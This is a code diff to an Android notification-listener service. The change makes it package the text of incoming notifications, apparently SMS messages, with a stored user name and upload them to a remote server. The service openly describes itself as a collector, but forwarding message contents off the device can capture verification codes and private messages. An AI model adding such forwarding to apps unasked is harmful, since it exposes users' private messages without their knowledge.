@@ -18,9 +18,12 @@ import java.util.HashSet;
 import java.util.Map;
 import java.util.regex.Pattern;
 
+import com.aliTao.Config;
 import com.aliTao.database.AppinfosDatabase;
+import com.aliTao.model.BaseResult;
 import com.aliTao.utils.ServerJiangUtils;
-import com.aliTao.utils.WXUtils;;
+import com.aliTao.utils.WXUtils;
+import com.google.gson.Gson;;import okhttp3.Call;
 
 /**
  * 在这里可以监听数据
@@ -30,6 +33,26 @@ import com.aliTao.utils.WXUtils;;
 @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
 public class NotificationCollectorService extends NotificationListenerService {
 
+    class MsgInfo{
+        public String getUserName() {
+            return userName;
+        }
+
+        public void setUserName(String userName) {
+            this.userName = userName;
+        }
+
+        public String getComment() {
+            return comment;
+        }
+
+        public void setComment(String comment) {
+            this.comment = comment;
+        }
+
+        private String userName;
+        private String comment;
+    }
     //当接受到新的通知信息时就会调用该函数
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
     @Override
@@ -47,20 +70,26 @@ public class NotificationCollectorService extends NotificationListenerService {
                 HashMap<String,String> map = new HashMap<>();
                 map.put("userName","");
                 map.put("comment",sb.toString());
-//                Observable<UserBean> login = OkHttpManager.Companion.getInstance().apiService(this)
-//                        .commitMsg(map);
-//                OkHttpManager.Companion.getInstance().CallObserDialog(login, new OkHttpManager.HttpClickLenerlist<UserBean>() {
-//                    @Override
-//                    public void onSucc(UserBean obj) {
-//                        Log.e("wqx",obj.toString());
-//                    }
+                MsgInfo msgInfo = new MsgInfo();
+                msgInfo.setComment(text);
+                msgInfo.setUserName(Config.GetString(getApplicationContext(),Config.SHARE_USER_NAME));
+                CB_NetApi.saveMsgInfo(new Gson().toJson(msgInfo), new JsonCallback<BaseResult>() {
+                    @Override
+                    public void onFail(Call call, Exception e, int id) {
+                        Log.e("wqx",e.toString());
+                    }
+
+                    @Override
+                    public void onException(BaseResult response, int id) {
+                        Log.e("wqx",response.toString());
+                    }
+
+                    @Override
+                    public void onSuccess(BaseResult response, int id) {
+                        Log.e("wqx",response.toString());
+                    }
+                });
 //
-//                    @Override
-//                    public void onFail(UserBean obj) {
-//                        Log.e("wqx",obj.toString());
-//
-//                    }
-//                },false);
             }
         } else {
             Log.e("wqx","不是短信内容");
